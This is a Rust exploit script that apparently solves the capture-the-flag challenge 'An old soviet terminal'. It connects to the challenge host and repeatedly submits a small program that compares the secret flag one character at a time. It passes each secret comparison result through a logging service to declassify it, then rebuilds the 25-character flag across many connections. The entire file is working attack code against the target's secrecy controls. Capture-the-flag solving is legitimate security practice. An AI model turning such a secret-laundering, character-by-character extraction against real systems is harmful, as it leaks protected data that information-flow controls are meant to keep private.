// Budget-sized flag extractor for "An old soviet terminal".
//
// Validation (validate.rs) proved EVERY primitive round-trips: handshake, analyze,
// length(=25), compare, log/logged, launder-branch, and a full single-position charset
// scan (T5 -> "g"). The ONLY thing that ever failed was program LENGTH: a whole-flag
// retriever does ~25 chars x ~75 charset = thousands of cross-node actor round-trips and
// dies (ERROR) before the terminal's ~2000ms self-kill. A single-position scan finishes
// in time and returns a Message. So we leak ONE index per connection and reassemble.
//
// Known from validation: LEN=25, prefix "grey{" (idx 0..4), suffix "}" (idx 24).
// We therefore only scan indices 5..24 (the scan will also re-confirm "}" at 24).
//
// Per-connection program (W=1) -- charAt secret bool, laundered public through logService:
//   fun p i d = compare(i,d) |> log |> logged-bool         (declassified, PUBLIC)
//   fun sc i j = first charset char c with p i c == true, else "?"
//   in sc IDX 0 end                                         (returns the char at IDX)
//
//   rustc -O extract.rs -o extract && ./extract [GAP_SECS] [START_IDX]
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};
use std::{env, fs, thread};

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
const FRAME_WAIT: Duration = Duration::from_secs(14); // frames render by ~11s post-EOF
const TAIL: Duration = Duration::from_secs(8);
const LEN: usize = 25;          // proven by T1b (### x25)
const SEED: &str = "grey{";     // proven prefix, indices 0..4
const PROG: &str = "extract_progress.txt";
const FLAG: &str = "flag.txt";
// frequency-ordered: underscore + lowercase(eng-freq) + digits + braces + symbols + UPPER.
// flag char found earlier in this list => fewer compares => more likely to fit budget.
const CS: &str = "_etaoinshrdlcumwfgypbvkjxqz0123456789{}-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ";

fn contains(h: &[u8], n: &[u8]) -> bool { !n.is_empty() && n.len() <= h.len() && h.windows(n.len()).any(|w| w == n) }
fn contains_any(h: &[u8], ns: &[&[u8]]) -> bool { ns.iter().any(|n| contains(h, n)) }

fn read_until_any(s: &mut TcpStream, needles: &[&[u8]], cap: Duration, buf: &mut Vec<u8>) {
    let mut tmp = [0u8; 8192];
    let t0 = Instant::now();
    loop {
        if t0.elapsed() >= cap { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => { buf.extend_from_slice(&tmp[..n]); if contains_any(buf, needles) { break; } }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
}

fn attempt(addr: &std::net::SocketAddr, prog: &str) -> std::io::Result<String> {
    let mut s = TcpStream::connect_timeout(addr, Duration::from_secs(6))?;
    s.set_read_timeout(Some(Duration::from_millis(200)))?;
    s.set_write_timeout(Some(Duration::from_secs(8)))?;
    let mut buf = Vec::new();
    read_until_any(&mut s, &[b">>"], Duration::from_secs(4), &mut buf);
    s.write_all(b"4\n")?; s.flush()?;
    buf.clear();
    read_until_any(&mut s, &[b">>"], Duration::from_secs(4), &mut buf);
    s.write_all(prog.as_bytes())?; s.write_all(b"\nEOF\n")?; s.flush()?;
    buf.clear();
    read_until_any(&mut s, &[b"TELETYPE OUTPUT", b"[BUSY]", b"queue is full"], FRAME_WAIT, &mut buf);
    read_until_any(&mut s, &[b"[1] Archive"], TAIL, &mut buf);
    Ok(String::from_utf8_lossy(&buf).into_owned())
}

#[derive(Debug)]
enum V { Msg(String), Busy, Timeout, Error, NoFrame }

fn verdict(out: &str) -> V {
    if let Some(m) = out.lines().find(|l| l.contains("Message:"))
        .map(|l| l.replace('\u{2551}', "").split("Message:").nth(1).unwrap_or("").trim().to_string())
        .filter(|m| !m.is_empty()) { return V::Msg(m); }
    if out.contains("[BUSY]") || out.contains("queue is full") { return V::Busy; }
    if out.contains("exceeded time allocation") || out.contains("[TIMEOUT]") { return V::Timeout; }
    if out.contains("terminated abnormally") { return V::Error; }
    V::NoFrame
}

// single-position scan: returns charset char at index `idx`, or "?" if not in CS.
fn scan_prog(idx: usize) -> String {
    format!(
        "let val cs=\"{CS}\"\n\
         fun a j=substring(cs,j,j+1)\n\
         fun p i d=(send(analysisService,(\"compare\",self(),i,d));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>b])])\n\
         fun sc i j=if a j=\"\" then \"?\" else if p i(a j)then a j else sc i(j+1)\n\
         in sc {idx} 0 end"
    )
}

fn load() -> String {
    fs::read_to_string(PROG).ok()
        .and_then(|t| t.lines().find_map(|l| l.strip_prefix("FOUND=").map(|v| v.to_string())))
        .filter(|f| !f.is_empty())
        .unwrap_or_else(|| SEED.to_string())
}
fn save(found: &str) { let _ = fs::write(PROG, format!("LEN={LEN}\nFOUND={found}\n")); }

fn main() {
    let argv: Vec<String> = env::args().skip(1).collect();
    let gap: u64 = argv.get(0).and_then(|x| x.parse().ok()).unwrap_or(3);
    let addr = (HOST, PORT).to_socket_addrs().ok().and_then(|mut a| a.next()).expect("DNS");

    let mut found = load();
    save(&found);
    println!("[extract] LEN={LEN} gap={gap}s  start FOUND={found:?} (have {}/{LEN})", found.chars().count());

    let mut tries = 0u64;
    let (mut ok, mut busy, mut err, mut to, mut nf) = (0u64, 0u64, 0u64, 0u64, 0u64);
    loop {
        let idx = found.chars().count();
        if idx >= LEN {
            let _ = fs::write(FLAG, &found);
            println!("\n#### FLAG ({LEN} chars): {found} ####");
            println!("[extract] stats: ok={ok} busy={busy} err={err} timeout={to} noframe={nf} over {tries} conns");
            return;
        }
        tries += 1;
        let t0 = Instant::now();
        match attempt(&addr, &scan_prog(idx)) {
            Err(e) => { println!("[t{tries}] idx{idx} refused: {e} ({:.1}s)", t0.elapsed().as_secs_f32());
                thread::sleep(Duration::from_secs(gap)); }
            Ok(out) => match verdict(&out) {
                V::Msg(m) => {
                    // take the single scanned char; "?" = charset gap (shouldn't happen)
                    let c: String = m.chars().take_while(|c| *c != '?').take(1).collect();
                    if c.is_empty() {
                        println!("[t{tries}] idx{idx} scan returned {m:?} (no match / charset gap)");
                        thread::sleep(Duration::from_secs(gap));
                    } else {
                        ok += 1; found.push_str(&c); save(&found);
                        println!("[t{tries}] idx{idx} = {c:?}  ({:.1}s)  FOUND={found:?}", t0.elapsed().as_secs_f32());
                    }
                }
                V::Busy => { busy += 1; println!("[t{tries}] idx{idx} BUSY (saturated) ({:.1}s)", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap.max(3) * 2)); }
                V::Timeout => { to += 1; println!("[t{tries}] idx{idx} TIMEOUT(10s) ({:.1}s)", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap)); }
                V::Error => { err += 1; println!("[t{tries}] idx{idx} ERROR(abnormal) ({:.1}s)", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap)); }
                V::NoFrame => { nf += 1; println!("[t{tries}] idx{idx} no-frame ({:.1}s)", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap)); }
            },
        }
    }
}
